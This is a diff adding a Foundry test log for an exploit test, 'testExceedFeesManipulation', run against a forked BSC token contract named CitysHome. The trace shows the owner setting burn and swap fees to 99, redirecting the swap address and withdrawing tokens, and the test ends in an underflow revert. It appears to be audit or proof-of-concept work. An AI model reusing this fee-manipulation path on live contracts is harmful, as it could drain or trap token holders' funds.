@@ -1,0 +1,58 @@
+No files changed, compilation skipped
+2026-06-16T10:46:38.833399Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/104552694"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[FAIL: panic: arithmetic underflow or overflow (0x11)] testExceedFeesManipulation() (gas: 89606)
+2026-06-16T10:46:44.226470Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:46:44.226677Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:46:44.228670Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:46:44.228778Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:46:45.586947Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:46:45.587076Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:46:45.587170Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:46:45.587268Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+Traces:
+  [18431] ExploitTest::setUp()
+    ├─ [0] VM::label(CitysHome: [0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543], "CitysHome")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(deadWallet: [0x000000000000000000000000000000000000dEaD], "deadWallet")
+    │   └─ ← [Return]
+    ├─ [2398] CitysHome::owner() [staticcall]
+    │   └─ ← [Return] owner: [0x68737dAD0d27bbdD9CEF97ec7F9a4558b274D04a]
+    ├─ [0] VM::label(owner: [0x68737dAD0d27bbdD9CEF97ec7F9a4558b274D04a], "owner")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(manipulator: [0x000000000000000000000000000000000000bEEF], "manipulator")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [89606] ExploitTest::testExceedFeesManipulation()
+    ├─ [0] VM::startPrank(owner: [0x68737dAD0d27bbdD9CEF97ec7F9a4558b274D04a])
+    │   └─ ← [Return]
+    ├─ [24656] CitysHome::setSwapAddress(manipulator: [0x000000000000000000000000000000000000bEEF])
+    │   └─ ← [Stop]
+    ├─ [5453] CitysHome::setBurnFee(99)
+    │   └─ ← [Stop]
+    ├─ [5409] CitysHome::setSwapFee(99)
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(owner: [0x68737dAD0d27bbdD9CEF97ec7F9a4558b274D04a])
+    │   └─ ← [Return]
+    ├─ [37241] CitysHome::ownerWithdrew(1000000 [1e6])
+    │   ├─ emit Transfer(from: CitysHome: [0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543], to: owner: [0x68737dAD0d27bbdD9CEF97ec7F9a4558b274D04a], value: 1000000000000000000000000 [1e24])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(owner: [0x68737dAD0d27bbdD9CEF97ec7F9a4558b274D04a])
+    │   └─ ← [Return]
+    ├─ [2116] CitysHome::transfer(manipulator: [0x000000000000000000000000000000000000bEEF], 100000000000000000000000 [1e23])
+    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
+    └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.39s (2.57s CPU time)
+
+Ran 1 test suite in 8.28s (5.39s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Exploit.t.sol:ExploitTest
+[FAIL: panic: arithmetic underflow or overflow (0x11)] testExceedFeesManipulation() (gas: 89606)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
